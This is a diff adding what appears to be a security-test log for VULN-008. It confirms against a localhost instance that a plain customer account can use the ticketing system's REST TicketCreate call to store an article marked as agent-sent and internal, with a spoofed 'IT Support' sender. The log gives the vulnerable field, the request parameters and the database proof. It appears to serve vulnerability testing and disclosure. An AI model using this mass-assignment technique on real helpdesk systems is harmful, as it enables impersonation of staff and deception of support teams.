@@ -1,0 +1,13 @@
+==========================================================================
+VULN-008: GI customer forges agent/internal article (TicketCreate)
+Target: http://localhost:25114
+[INFO] TicketCreate.pm:553 only DEFAULTS SenderType — a supplied SenderType=agent survives
+[INFO] customer per-field check neutralised (CustomerUserIDCheck Granted=1 + CustomerGroupSupport=0)
+==========================================================================
+[SETUP] imported web service GTCR_cfd5fe82 (shipped GenericTicketConnectorREST example)
+[SETUP] created customer cust008_04c3ff54 (cid=cust008_04c3ff54) — a plain, unprivileged portal account
+[STEP] POST /Ticket as CUSTOMER with Article.SenderType=agent, IsVisibleForCustomer=0, spoofed From
+[PROOF] HTTP 200 -> {'ArticleID': 76, 'TicketID': '63', 'TicketNumber': '2026092910000621'}
+[PROOF] stored article (DB): sender_type=agent, is_visible_for_customer=0, from='IT Support <helpdesk@corp.example>'
+[OK] exploit confirmed — customer cust008_04c3ff54 created ticket 63 whose article is stored SenderType=agent, IsVisibleForCustomer=0, From spoofed to 'IT Support' — a forged internal staff note the customer UI can never produce (BFLA/mass-assignment).
+==> VULN-008: CONFIRMED — customer cust008_04c3ff54 created ticket 63 whose article is stored SenderType=agent, IsVisibleForCustomer=0, From spoofed to 'IT Support' — a forged internal staff note the customer UI can never produce (BFLA/mass-assignment).
